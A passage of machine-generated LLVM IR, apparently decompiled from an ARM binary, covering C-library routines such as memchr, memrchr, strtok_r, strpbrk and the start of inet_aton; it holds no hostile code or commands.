  uselistorder i32 -12, { 1, 13, 14, 2, 16, 17, 3, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 4, 5, 6, 23, 7, 24, 25, 27, 28, 29, 26, 0 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0, 22 }
  uselistorder i32 27, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -8, { 13, 14, 15, 16, 17, 18, 12, 11, 5, 10, 9, 8, 7, 19, 20, 21, 22, 6, 23, 24, 3, 0, 28, 25, 26, 27, 2, 29, 30, 4, 1 }
  uselistorder label %dec_label_pc_177a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1773c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_176d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17670, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_175fc, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_175c0, { 1, 0 }
  uselistorder label %dec_label_pc_175ac, { 1, 0 }
  uselistorder label %dec_label_pc_1756c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17500, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17494, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17434, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_173a8, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_17368, { 1, 0 }
}

define i32 @function_177c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_177c8:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_177d0 = load i32, i32* @r0, align 4
  %v1_177d0 = load i32, i32* @r1, align 4
  %v2_177d0 = inttoptr i32 %v0_177d0 to i8*
  %v3_177d0 = call i32 @_memcpy(i8* %v2_177d0, i32 %v1_177d0)
  ret i32 %v3_177d0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_177e0 = load i32, i32* @r4, align 4
  %v6_177e0 = load i32, i32* @r5, align 4
  %v9_177e0 = load i32, i32* @r6, align 4
  %v1_177e4 = urem i32 %arg1, 256
  %v0_1780018 = load i32, i32* @r2, align 4
  %v2_1780020 = icmp eq i32 %v0_1780018, 0
  br i1 %v2_1780020, label %dec_label_pc_17810, label %dec_label_pc_17808

dec_label_pc_177ec:                               ; preds = %dec_label_pc_17808
  %v3_177ec = load i8, i8* %.021, align 1
  %v4_177ec = zext i8 %v3_177ec to i32
  %v9_177f0 = icmp eq i32 %v4_177ec, %v1_177e4
  %v1_177f4 = add i32 %v0_177f4, -1
  br i1 %v9_177f0, label %bb, label %dec_label_pc_17800

bb:                                               ; preds = %dec_label_pc_177ec
  ret i32 %v1_17808

dec_label_pc_17800:                               ; preds = %dec_label_pc_177ec
  %v2_177fc = add i32 %v1_17808, 1
  %v3_177fc = inttoptr i32 %v2_177fc to i8*
  %v2_17800 = icmp eq i32 %v1_177f4, 0
  br i1 %v2_17800, label %dec_label_pc_17810, label %dec_label_pc_17808

dec_label_pc_17808:                               ; preds = %entry, %dec_label_pc_17800
  %v0_177f4 = phi i32 [ %v1_177f4, %dec_label_pc_17800 ], [ %v0_1780018, %entry ]
  %.021 = phi i8* [ %v3_177fc, %dec_label_pc_17800 ], [ undef, %entry ]
  %v1_17808 = ptrtoint i8* %.021 to i32
  %v2_17808 = urem i32 %v1_17808, 4
  %v3_17808 = icmp eq i32 %v2_17808, 0
  br i1 %v3_17808, label %dec_label_pc_17810, label %dec_label_pc_177ec

dec_label_pc_17810:                               ; preds = %dec_label_pc_17800, %dec_label_pc_17808, %entry
  %v0_1789c37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_17800 ], [ %v0_177f4, %dec_label_pc_17808 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_177fc, %dec_label_pc_17800 ], [ %.021, %dec_label_pc_17808 ]
  %v4_17810 = mul nuw nsw i32 %v1_177e4, 256
  %v5_17810 = or i32 %v4_17810, %v1_177e4
  %v1_17814 = ptrtoint i8* %.0.lcssa to i32
  %v4_17818 = mul i32 %v5_17810, 65536
  %v5_17818 = or i32 %v4_17818, %v5_17810
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_1789c37, 3
  br i1 %tmp, label %dec_label_pc_17820, label %dec_label_pc_178c4.preheader

dec_label_pc_17820:                               ; preds = %dec_label_pc_17810, %dec_label_pc_1789c.backedge
  %v0_1783c82 = phi i32 [ %v1_1783c, %dec_label_pc_1789c.backedge ], [ %v0_1789c37, %dec_label_pc_17810 ]
  %v0_1782081 = phi i32 [ %v4_17820, %dec_label_pc_1789c.backedge ], [ %v1_17814, %dec_label_pc_17810 ]
  %v1_17820 = inttoptr i32 %v0_1782081 to i32*
  %v2_17820 = load i32, i32* %v1_17820, align 4
  %v4_17820 = add i32 %v0_1782081, 4
  %v2_17824 = xor i32 %v2_17820, %v5_17818
  %v2_17828 = add i32 %v2_17824, 2130640639
  %v1_1782c = sub i32 -1, %v2_17824
  %v2_17830 = xor i32 %v2_17828, %v1_1782c
  %v2_17834 = and i32 %v2_17830, -2130640640
  %v2_17838 = icmp eq i32 %v2_17834, 0
  %v1_1783c = add i32 %v0_1783c82, -4
  br i1 %v2_17838, label %dec_label_pc_1789c.backedge, label %dec_label_pc_17844

dec_label_pc_1789c.backedge:                      ; preds = %dec_label_pc_17820, %dec_label_pc_17888
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_1783c, 3
  br i1 %tmp107, label %dec_label_pc_17820, label %dec_label_pc_178c4.preheader

dec_label_pc_17844:                               ; preds = %dec_label_pc_17820
  %v2_17844 = inttoptr i32 %v0_1782081 to i8*
  %v3_17844 = load i8, i8* %v2_17844, align 1
  %v4_17844 = zext i8 %v3_17844 to i32
  %v9_1784c = icmp eq i32 %v4_17844, %v1_177e4
  %v1_17850 = add i32 %v0_1782081, 3
  %v1_17854 = add i32 %v0_1782081, 1
  store i32 %v1_17854, i32* @lr, align 4
  %v1_17858 = add i32 %v0_1782081, 2
  br i1 %v9_1784c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_17844
  store i32 %v3_177e0, i32* @r4, align 4
  store i32 %v6_177e0, i32* @r5, align 4
  store i32 %v9_177e0, i32* @r6, align 4
  ret i32 %v0_1782081

bb51:                                             ; preds = %dec_label_pc_17844
  %v2_17860 = inttoptr i32 %v1_17854 to i8*
  %v3_17860 = load i8, i8* %v2_17860, align 1
  %v4_17860 = zext i8 %v3_17860 to i32
  %v9_17864 = icmp eq i32 %v4_17860, %v1_177e4
  br i1 %v9_17864, label %dec_label_pc_1786c, label %dec_label_pc_17874

dec_label_pc_1786c:                               ; preds = %bb51
  store i32 %v3_177e0, i32* @r4, align 4
  store i32 %v6_177e0, i32* @r5, align 4
  store i32 %v9_177e0, i32* @r6, align 4
  ret i32 %v1_17854

dec_label_pc_17874:                               ; preds = %bb51
  %v2_17874 = inttoptr i32 %v1_17858 to i8*
  %v3_17874 = load i8, i8* %v2_17874, align 1
  %v4_17874 = zext i8 %v3_17874 to i32
  %v9_17878 = icmp eq i32 %v4_17874, %v1_177e4
  br i1 %v9_17878, label %dec_label_pc_17880, label %dec_label_pc_17888

dec_label_pc_17880:                               ; preds = %dec_label_pc_17874
  store i32 %v3_177e0, i32* @r4, align 4
  store i32 %v6_177e0, i32* @r5, align 4
  store i32 %v9_177e0, i32* @r6, align 4
  ret i32 %v1_17858

dec_label_pc_17888:                               ; preds = %dec_label_pc_17874
  %v2_17888 = inttoptr i32 %v1_17850 to i8*
  %v3_17888 = load i8, i8* %v2_17888, align 1
  %v4_17888 = zext i8 %v3_17888 to i32
  %v9_1788c = icmp eq i32 %v4_17888, %v1_177e4
  br i1 %v9_1788c, label %dec_label_pc_17894, label %dec_label_pc_1789c.backedge

dec_label_pc_17894:                               ; preds = %dec_label_pc_17888
  store i32 %v3_177e0, i32* @r4, align 4
  store i32 %v6_177e0, i32* @r5, align 4
  store i32 %v9_177e0, i32* @r6, align 4
  ret i32 %v1_17850

dec_label_pc_178c4.preheader:                     ; preds = %dec_label_pc_1789c.backedge, %dec_label_pc_17810
  %v0_17820.lcssa = phi i32 [ %v1_17814, %dec_label_pc_17810 ], [ %v4_17820, %dec_label_pc_1789c.backedge ]
  %v0_1783c.lcssa = phi i32 [ %v0_1789c37, %dec_label_pc_17810 ], [ %v1_1783c, %dec_label_pc_1789c.backedge ]
  %v2_178c411 = icmp eq i32 %v0_1783c.lcssa, 0
  br i1 %v2_178c411, label %dec_label_pc_178cc, label %dec_label_pc_178b4

dec_label_pc_178b4:                               ; preds = %dec_label_pc_178c4, %dec_label_pc_178c4.preheader
  %v0_178c4.in = phi i32 [ %v0_178c4, %dec_label_pc_178c4 ], [ %v0_1783c.lcssa, %dec_label_pc_178c4.preheader ]
  %v15_178bc = phi i32 [ %v1_178c0, %dec_label_pc_178c4 ], [ %v0_17820.lcssa, %dec_label_pc_178c4.preheader ]
  %v0_178c4 = add i32 %v0_178c4.in, -1
  %v1_178b4 = inttoptr i32 %v15_178bc to i8*
  %v2_178b4 = load i8, i8* %v1_178b4, align 1
  %v3_178b4 = zext i8 %v2_178b4 to i32
  %v9_178b8 = icmp eq i32 %v3_178b4, %v1_177e4
  br i1 %v9_178b8, label %bb52, label %dec_label_pc_178c4

bb52:                                             ; preds = %dec_label_pc_178b4
  store i32 %v3_177e0, i32* @r4, align 4
  store i32 %v6_177e0, i32* @r5, align 4
  store i32 %v9_177e0, i32* @r6, align 4
  ret i32 %v15_178bc

dec_label_pc_178c4:                               ; preds = %dec_label_pc_178b4
  %v1_178c0 = add i32 %v15_178bc, 1
  %v2_178c4 = icmp eq i32 %v0_178c4, 0
  br i1 %v2_178c4, label %dec_label_pc_178cc, label %dec_label_pc_178b4

dec_label_pc_178cc:                               ; preds = %dec_label_pc_178c4, %dec_label_pc_178c4.preheader
  store i32 %v3_177e0, i32* @r4, align 4
  store i32 %v6_177e0, i32* @r5, align 4
  store i32 %v9_177e0, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_178bc, { 1, 0, 2 }
  uselistorder i32 %v1_1783c, { 1, 0, 2 }
  uselistorder i32 %v0_1782081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_17810, { 1, 0 }
  uselistorder i32 %v0_1789c37, { 1, 2, 0 }
  uselistorder i32 %v1_177e4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_177e0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1789c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_17820, { 1, 0 }
  uselistorder label %dec_label_pc_17810, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17808, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_178e8 = call i32 @memcpy()
  %v0_178ec = load i32, i32* @r5, align 4
  %v1_178ec = load i32, i32* @r4, align 4
  %v2_178ec = add i32 %v1_178ec, %v0_178ec
  ret i32 %v2_178ec
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_178f4 = load i32, i32* @r4, align 4
  %v1_178f8 = urem i32 %arg2, 256
  %v2_178fc = add i32 %arg3, %arg1
  %v2_179142 = icmp eq i32 %arg3, 0
  br i1 %v2_179142, label %dec_label_pc_17924, label %dec_label_pc_1791c

dec_label_pc_17904:                               ; preds = %dec_label_pc_1791c
  %v1_17904 = add i32 %v0_17904, -1
  %v2_17904 = inttoptr i32 %v1_17904 to i8*
  %v3_17904 = load i8, i8* %v2_17904, align 1
  %v4_17904 = zext i8 %v3_17904 to i32
  %v9_17908 = icmp eq i32 %v4_17904, %v1_178f8
  br i1 %v9_17908, label %bb, label %dec_label_pc_17914

bb:                                               ; preds = %dec_label_pc_17904
  ret i32 %v1_17904

dec_label_pc_17914:                               ; preds = %dec_label_pc_17904
  %v1_17910 = add i32 %v0_17910, -1
  %v2_17914 = icmp eq i32 %v1_17910, 0
  br i1 %v2_17914, label %dec_label_pc_17924, label %dec_label_pc_1791c

dec_label_pc_1791c:                               ; preds = %entry, %dec_label_pc_17914
  %v0_17910 = phi i32 [ %v1_17910, %dec_label_pc_17914 ], [ %arg3, %entry ]
  %v0_17904 = phi i32 [ %v1_17904, %dec_label_pc_17914 ], [ %v2_178fc, %entry ]
  %v1_1791c = urem i32 %v0_17904, 4
  %v2_1791c = icmp eq i32 %v1_1791c, 0
  br i1 %v2_1791c, label %dec_label_pc_17924, label %dec_label_pc_17904

dec_label_pc_17924:                               ; preds = %dec_label_pc_17914, %dec_label_pc_1791c, %entry
  %v0_179bc11 = phi i32 [ %v2_178fc, %entry ], [ %v1_17904, %dec_label_pc_17914 ], [ %v0_17904, %dec_label_pc_1791c ]
  %v0_179a87 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_17914 ], [ %v0_17910, %dec_label_pc_1791c ]
  %v4_17924 = mul nuw nsw i32 %v1_178f8, 256
  %v5_17924 = or i32 %v4_17924, %v1_178f8
  %v4_17928 = mul i32 %v5_17924, 65536
  %v5_17928 = or i32 %v4_17928, %v5_17924
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_179a87, 3
  br i1 %tmp, label %dec_label_pc_17930, label %dec_label_pc_179b8

dec_label_pc_17930:                               ; preds = %dec_label_pc_17924, %.backedge.backedge
  %v0_1794c51 = phi i32 [ %v1_1794c, %.backedge.backedge ], [ %v0_179a87, %dec_label_pc_17924 ]
  %v0_1793050 = phi i32 [ %v1_17930, %.backedge.backedge ], [ %v0_179bc11, %dec_label_pc_17924 ]
  %v1_17930 = add i32 %v0_1793050, -4
  %v2_17930 = inttoptr i32 %v1_17930 to i32*
  %v3_17930 = load i32, i32* %v2_17930, align 4
  %v2_17934 = xor i32 %v3_17930, %v5_17928
  %v2_17938 = add i32 %v2_17934, 2130640639
  %v1_1793c = sub i32 -1, %v2_17934
  %v2_17940 = xor i32 %v2_17938, %v1_1793c
  %v2_17944 = and i32 %v2_17940, -2130640640
  %v2_17948 = icmp eq i32 %v2_17944, 0
  %v1_1794c = add i32 %v0_1794c51, -4
  br i1 %v2_17948, label %.backedge.backedge, label %dec_label_pc_17954

dec_label_pc_17954:                               ; preds = %dec_label_pc_17930
  %v1_17954 = add i32 %v0_1793050, -1
  %v2_17954 = inttoptr i32 %v1_17954 to i8*
  %v3_17954 = load i8, i8* %v2_17954, align 1
  %v4_17954 = zext i8 %v3_17954 to i32
  %v9_17958 = icmp eq i32 %v4_17954, %v1_178f8
  %v1_1795c = add i32 %v0_1793050, -2
  %v1_17964 = add i32 %v0_1793050, -3
  store i32 %v1_17964, i32* @lr, align 4
  br i1 %v9_17958, label %dec_label_pc_1796c, label %dec_label_pc_17974

dec_label_pc_1796c:                               ; preds = %dec_label_pc_17954
  store i32 %v3_178f4, i32* @r4, align 4
  ret i32 %v1_17954

dec_label_pc_17974:                               ; preds = %dec_label_pc_17954
  %v2_17974 = inttoptr i32 %v1_1795c to i8*
  %v3_17974 = load i8, i8* %v2_17974, align 1
  %v4_17974 = zext i8 %v3_17974 to i32
  %v9_17978 = icmp eq i32 %v4_17974, %v1_178f8
  br i1 %v9_17978, label %dec_label_pc_17980, label %dec_label_pc_17988

dec_label_pc_17980:                               ; preds = %dec_label_pc_17974
  store i32 %v3_178f4, i32* @r4, align 4
  ret i32 %v1_1795c

dec_label_pc_17988:                               ; preds = %dec_label_pc_17974
  %v2_17988 = inttoptr i32 %v1_17964 to i8*
  %v3_17988 = load i8, i8* %v2_17988, align 1
  %v4_17988 = zext i8 %v3_17988 to i32
  %v9_1798c = icmp eq i32 %v4_17988, %v1_178f8
  br i1 %v9_1798c, label %dec_label_pc_17994, label %dec_label_pc_1799c

dec_label_pc_17994:                               ; preds = %dec_label_pc_17988
  store i32 %v3_178f4, i32* @r4, align 4
  ret i32 %v1_17964

dec_label_pc_1799c:                               ; preds = %dec_label_pc_17988
  %v1_1799c = inttoptr i32 %v1_17930 to i8*
  %v2_1799c = load i8, i8* %v1_1799c, align 1
  %v3_1799c = zext i8 %v2_1799c to i32
  %v9_179a0 = icmp eq i32 %v3_1799c, %v1_178f8
  br i1 %v9_179a0, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_1799c, %dec_label_pc_17930
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_1794c, 3
  br i1 %tmp70, label %dec_label_pc_17930, label %dec_label_pc_179b8

bb19:                                             ; preds = %dec_label_pc_1799c
  store i32 %v3_178f4, i32* @r4, align 4
  ret i32 %v1_17930

dec_label_pc_179bc:                               ; preds = %dec_label_pc_179b8
  %v1_179c8 = add i32 %v0_179c8, -1
  %v1_179bc = add i32 %v0_179bc, -1
  %v2_179bc = inttoptr i32 %v1_179bc to i8*
  %v3_179bc = load i8, i8* %v2_179bc, align 1
  %v4_179bc = zext i8 %v3_179bc to i32
  %v9_179c0 = icmp eq i32 %v4_179bc, %v1_178f8
  br i1 %v9_179c0, label %bb20, label %dec_label_pc_179b8

bb20:                                             ; preds = %dec_label_pc_179bc
  store i32 %v3_178f4, i32* @r4, align 4
  ret i32 %v1_179bc

dec_label_pc_179b8:                               ; preds = %dec_label_pc_17924, %.backedge.backedge, %dec_label_pc_179bc
  %v0_179bc = phi i32 [ %v1_179bc, %dec_label_pc_179bc ], [ %v0_179bc11, %dec_label_pc_17924 ], [ %v1_17930, %.backedge.backedge ]
  %v0_179c8 = phi i32 [ %v1_179c8, %dec_label_pc_179bc ], [ %v0_179a87, %dec_label_pc_17924 ], [ %v1_1794c, %.backedge.backedge ]
  %v2_179c8 = icmp eq i32 %v0_179c8, 0
  br i1 %v2_179c8, label %dec_label_pc_179d0, label %dec_label_pc_179bc

dec_label_pc_179d0:                               ; preds = %dec_label_pc_179b8
  store i32 %v3_178f4, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_179c8, { 1, 0 }
  uselistorder i32 %v1_1794c, { 1, 0, 2 }
  uselistorder i32 %v1_17930, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1793050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17924, { 1, 0 }
  uselistorder i32 %v0_179a87, { 1, 2, 0 }
  uselistorder i32 %v0_17904, { 1, 0, 2 }
  uselistorder i32 %v1_17904, { 0, 2, 1, 3 }
  uselistorder i32 %v2_178fc, { 1, 0 }
  uselistorder i32 %v1_178f8, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_178f4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 -2, { 2, 4, 5, 3, 13, 7, 6, 12, 8, 14, 16, 15, 17, 0, 9, 1, 10, 18, 11 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_179b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17930, { 1, 0 }
  uselistorder label %dec_label_pc_17924, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1791c, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_179e0 = load i32, i32* @r4, align 4
  store i32 %v3_179e0, i32* %stack_var_-16, align 4
  %v6_179e0 = load i32, i32* @r5, align 4
  %v0_179e4 = load i32, i32* @r0, align 4
  store i32 %v0_179e4, i32* %r4.global-to-local, align 4
  %v2_179e4 = icmp eq i32 %v0_179e4, 0
  %v1_179e8 = load i32, i32* @r2, align 4
  br i1 %v2_179e4, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_179e8 = inttoptr i32 %v1_179e8 to i32*
  %v3_179e8 = load i32, i32* %v2_179e8, align 4
  store i32 %v3_179e8, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_179ec = phi i32 [ %v3_179e8, %bb ], [ %v0_179e4, %entry ]
  store i32 %v0_179ec, i32* @r0, align 4
  store i32 %v1_179e8, i32* @r5, align 4
  %v0_179f4 = load i32, i32* @r1, align 4
  store i32 %v0_179f4, i32* %r6.global-to-local, align 4
  %v1_179f8 = inttoptr i32 %v0_179ec to i8*
  %v2_179f8 = call i32 @__GI_strspn(i8* %v1_179f8)
  %v0_179fc = load i32, i32* %r4.global-to-local, align 4
  %v2_179fc = add i32 %v0_179fc, %v2_179f8
  %v3_179fc = inttoptr i32 %v2_179fc to i8*
  %v4_179fc = load i8, i8* %v3_179fc, align 1
  %v6_179fc = zext i8 %v4_179fc to i32
  store i32 %v6_179fc, i32* %r3.global-to-local, align 4
  store i32 %v2_179fc, i32* @r4, align 4
  %v2_17a04 = icmp eq i8 %v4_179fc, 0
  store i1 %v2_17a04, i1* @cpsr_z, align 1
  %v0_17a08 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_17a08, i32* @r1, align 4
  store i32 %v2_179fc, i32* @r0, align 4
  br i1 %v2_17a04, label %bb7, label %dec_label_pc_17a18

bb7:                                              ; preds = %entry._crit_edge
  %v2_17a10 = load i32, i32* @r5, align 4
  %v3_17a10 = inttoptr i32 %v2_17a10 to i32*
  store i32 %v2_179fc, i32* %v3_17a10, align 4
  br label %dec_label_pc_17a4c

dec_label_pc_17a18:                               ; preds = %entry._crit_edge
  %v0_17a18 = call i32 @__GI_strpbrk()
  store i32 %v0_17a18, i32* %r2.global-to-local, align 4
  %v3_17a1c = icmp eq i32 %v0_17a18, 0
  store i1 %v3_17a1c, i1* @cpsr_z, align 1
  br i1 %v3_17a1c, label %dec_label_pc_17a2c, label %dec_label_pc_17a3c

dec_label_pc_17a2c:                               ; preds = %dec_label_pc_17a18
  %v0_17a24 = load i32, i32* @r4, align 4
  %v2_17a2c = call i32 @rawmemchr(i32 %v0_17a24, i32 0)
  %v0_17a30 = load i32, i32* @r4, align 4
  store i32 %v0_17a30, i32* %r3.global-to-local, align 4
  %v1_17a34 = load i32, i32* @r5, align 4
  %v2_17a34 = inttoptr i32 %v1_17a34 to i32*
  store i32 %v2_17a2c, i32* %v2_17a34, align 4
  br label %dec_label_pc_17a4c

dec_label_pc_17a3c:                               ; preds = %dec_label_pc_17a18
  %v3_17a40 = inttoptr i32 %v0_17a18 to i8*
  store i8 0, i8* %v3_17a40, align 1
  %v4_17a40 = load i32, i32* %r2.global-to-local, align 4
  %v5_17a40 = add i32 %v4_17a40, 1
  store i32 %v5_17a40, i32* %r2.global-to-local, align 4
  %v1_17a44 = load i32, i32* @r5, align 4
  %v2_17a44 = inttoptr i32 %v1_17a44 to i32*
  store i32 %v5_17a40, i32* %v2_17a44, align 4
  %v0_17a48 = load i32, i32* @r4, align 4
  store i32 %v0_17a48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a4c

dec_label_pc_17a4c:                               ; preds = %bb7, %dec_label_pc_17a2c, %dec_label_pc_17a3c
  %v0_17a4c = load i32, i32* %r3.global-to-local, align 4
  %v2_17a50 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17a50, i32* @r4, align 4
  store i32 %v6_179e0, i32* @r5, align 4
  ret i32 %v0_17a4c

; uselistorder directives
  uselistorder i32 %v0_179ec, { 1, 0 }
  uselistorder i32 %v0_179e4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17a4c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_17a54 = load i32, i32* @r0, align 4
  %v1_17a782 = inttoptr i32 %v0_17a54 to i8*
  %v2_17a783 = load i8, i8* %v1_17a782, align 1
  %v3_17a784 = zext i8 %v2_17a783 to i32
  %v2_17a7c5 = icmp eq i8 %v2_17a783, 0
  br i1 %v2_17a7c5, label %dec_label_pc_17a78._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_17a84.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_17a5c:                               ; preds = %dec_label_pc_17a64
  %v1_17a6c = add i32 %v0_17a6c, 1
  %v9_17a5c = icmp eq i32 %v3_17a64, %v3_17a786
  br i1 %v9_17a5c, label %dec_label_pc_17a8c, label %dec_label_pc_17a64

dec_label_pc_17a64:                               ; preds = %dec_label_pc_17a5c, %bb
  %v0_17a6c = phi i32 [ %v1_17a6c, %dec_label_pc_17a5c ], [ %v0_17a84.pre, %bb ]
  %v1_17a64 = inttoptr i32 %v0_17a6c to i8*
  %v2_17a64 = load i8, i8* %v1_17a64, align 1
  %v3_17a64 = zext i8 %v2_17a64 to i32
  store i32 %v3_17a64, i32* @ip, align 4
  %v2_17a68 = icmp eq i8 %v2_17a64, 0
  br i1 %v2_17a68, label %dec_label_pc_17a74, label %dec_label_pc_17a5c

dec_label_pc_17a74:                               ; preds = %dec_label_pc_17a64
  %v1_17a74 = add i32 %v0_17a74, 1
  %v1_17a78 = inttoptr i32 %v1_17a74 to i8*
  %v2_17a78 = load i8, i8* %v1_17a78, align 1
  %v3_17a78 = zext i8 %v2_17a78 to i32
  %v2_17a7c = icmp eq i8 %v2_17a78, 0
  br i1 %v2_17a7c, label %dec_label_pc_17a78._crit_edge, label %bb

dec_label_pc_17a78._crit_edge:                    ; preds = %dec_label_pc_17a74, %entry
  %v3_17a78.lcssa = phi i32 [ %v3_17a784, %entry ], [ %v3_17a78, %dec_label_pc_17a74 ]
  ret i32 %v3_17a78.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_17a74
  %v0_17a74 = phi i32 [ %v0_17a54, %.lr.ph ], [ %v1_17a74, %dec_label_pc_17a74 ]
  %v3_17a786 = phi i32 [ %v3_17a784, %.lr.ph ], [ %v3_17a78, %dec_label_pc_17a74 ]
  br label %dec_label_pc_17a64

dec_label_pc_17a8c:                               ; preds = %dec_label_pc_17a5c
  ret i32 %v0_17a74

; uselistorder directives
  uselistorder i32 %v3_17a78, { 1, 0 }
  uselistorder i32 %v3_17a64, { 1, 0 }
  uselistorder i32 %v0_17a6c, { 1, 0 }
  uselistorder i32 %v3_17a784, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_17a64, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_17a94 = load i32, i32* %r0.global-to-local, align 4
  %v2_17a94 = icmp eq i32 %v0_17a94, 0
  %v3_17a98 = load i32, i32* @r4, align 4
  store i32 %v3_17a98, i32* %stack_var_-20, align 4
  br i1 %v2_17a94, label %dec_label_pc_17b74, label %dec_label_pc_17ab0.lr.ph

dec_label_pc_17ab0:                               ; preds = %dec_label_pc_17ab0.lr.ph, %dec_label_pc_17b34
  %v1_17b34 = phi i32 [ 0, %dec_label_pc_17ab0.lr.ph ], [ %v5_17b34, %dec_label_pc_17b34 ]
  %v0_17b38 = phi i32 [ 1, %dec_label_pc_17ab0.lr.ph ], [ %v1_17b38, %dec_label_pc_17b34 ]
  %v0_17ab8 = phi i32 [ %v0_17a94, %dec_label_pc_17ab0.lr.ph ], [ %v0_17ab825, %dec_label_pc_17b34 ]
  store i32 %v2_17ab4.pre, i32* @lr, align 4
  %v1_17ab8 = inttoptr i32 %v0_17ab8 to i8*
  %v2_17ab8 = load i8, i8* %v1_17ab8, align 1
  %v3_17ab8 = zext i8 %v2_17ab8 to i32
  %v3_17abc = mul nuw nsw i32 %v3_17ab8, 2
  %v4_17abc = add i32 %v3_17abc, %v2_17ab4.pre
  %v5_17abc = inttoptr i32 %v4_17abc to i8*
  %v6_17abc = load i8, i8* %v5_17abc, align 1
  %v1_17ac0 = and i8 %v6_17abc, 8
  %v2_17ac0 = icmp eq i8 %v1_17ac0, 0
  br i1 %v2_17ac0, label %dec_label_pc_17b74, label %dec_label_pc_17ac8

dec_label_pc_17ac8:                               ; preds = %dec_label_pc_17ab0
  br label %dec_label_pc_17ae8

dec_label_pc_17ad0:                               ; preds = %dec_label_pc_17ae8
  %v3_17ad4 = mul i32 %v0_17b34, 10
  %v4_17ad4 = add i32 %v3_17ae8, %v3_17ad4
